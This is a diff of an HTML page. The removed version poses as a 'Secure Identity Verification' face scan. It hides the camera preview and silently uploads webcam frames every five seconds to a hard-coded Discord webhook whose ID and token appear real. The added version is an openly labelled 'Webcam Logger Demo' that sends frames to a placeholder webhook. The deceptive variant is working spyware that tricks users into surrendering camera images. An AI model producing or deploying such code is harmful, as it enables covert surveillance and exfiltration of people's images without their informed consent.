@@ -3,70 +3,55 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Security Checkpoint</title>
+  <title>Test Webcam Logger</title>
   <style>
     body {
-      background-color: #0d0d0d;
+      background-color: #101010;
       color: #00ffcc;
       font-family: 'Courier New', Courier, monospace;
       text-align: center;
-      margin: 0;
       padding: 50px;
     }
-    h1 {
-      font-size: 2.5em;
-    }
-    p {
-      font-size: 1.2em;
-      margin-bottom: 30px;
+    video {
+      display: block;
+      margin: 20px auto;
+      border: 2px solid #00ffcc;
+      border-radius: 10px;
+      width: 80%;
+      max-width: 400px;
     }
     button {
-      font-size: 1.5em;
-      padding: 15px 30px;
-      border: none;
+      padding: 10px 20px;
+      font-size: 1.2em;
       background-color: #00ffcc;
-      color: black;
-      border-radius: 10px;
+      border: none;
+      border-radius: 5px;
       cursor: pointer;
-    }
-    button:disabled {
-      background-color: gray;
-      cursor: not-allowed;
-    }
-    video {
-      display: none;
+      color: black;
     }
   </style>
 </head>
 <body>
-  <h1>Secure Identity Verification</h1>
-  <p>Click the button below to begin face verification.</p>
-  <button onclick="startVerification()">Begin Verification</button>
-  <video id="cameraStream" autoplay playsinline></video>
+  <h1>Webcam Logger Demo</h1>
+  <p>This is a test to send webcam frames to your Discord Webhook every 5 seconds.</p>
+  <button onclick="startLogger()">Start Test</button>
+  <video id="video" autoplay playsinline></video>
 
   <script>
-    const webhookURL = "https://discordapp.com/api/webhooks/1360012861673570315/ZqzUK5SoTzzvkBMIGPbH00hA9lt0nAj_eHAbqbqS-Y4vfhq1Dy-sX4ULdcdTWwl0Ui6L";
+    const webhookURL = "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN"; // Replace this!
 
-    async function startVerification() {
-      const button = document.querySelector("button");
-      const info = document.querySelector("p");
-      const video = document.getElementById("cameraStream");
-
+    async function startLogger() {
+      const video = document.getElementById("video");
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
-        button.disabled = true;
-        info.textContent = "Face scan in progress, please stay still...";
 
-        video.onloadedmetadata = () => {
-          video.play();
-          setInterval(() => {
-            captureAndSend(video);
-          }, 5000); // every 5 seconds
-        };
+        setInterval(() => {
+          captureAndSend(video);
+        }, 5000);
       } catch (err) {
         console.error("Camera access failed:", err);
-        info.textContent = "Camera access denied or unavailable.";
+        alert("Camera access was denied.");
       }
     }
 
@@ -75,36 +60,23 @@
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       const ctx = canvas.getContext("2d");
-
-      if (!ctx) {
-        console.error("Canvas context is null.");
-        return;
-      }
-
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
       canvas.toBlob(async (blob) => {
-        if (!blob) {
-          console.error("Failed to create image blob.");
-          return;
-        }
-
+        if (!blob) return;
         const formData = new FormData();
         formData.append("file", blob, "frame.jpg");
 
         try {
-          const response = await fetch(webhookURL, {
+          await fetch(webhookURL, {
             method: "POST",
             body: formData
           });
-
-          if (!response.ok) {
-            console.error("Upload failed:", response.statusText);
-          }
+          console.log("Sent frame to Discord.");
         } catch (e) {
-          console.error("Upload error:", e);
+          console.error("Webhook failed:", e);
         }
-      }, "image/jpeg", 0.6);
+      }, "image/jpeg", 0.7);
     }
   </script>
 </body>
